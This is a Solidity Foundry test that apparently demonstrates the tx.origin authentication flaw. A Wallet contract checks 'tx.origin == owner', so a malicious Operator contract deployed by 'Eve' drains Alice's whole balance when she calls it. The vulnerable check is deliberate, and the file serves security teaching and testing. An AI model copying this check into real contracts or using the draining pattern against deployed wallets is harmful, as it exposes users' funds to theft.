// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    Wallet WalletContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", WalletContract.owner());
        vm.prank(eve);
        OperatorContract = new Operator(WalletContract);
        console.log("Owner of operator contract", OperatorContract.owner());
        console.log("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function operate() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}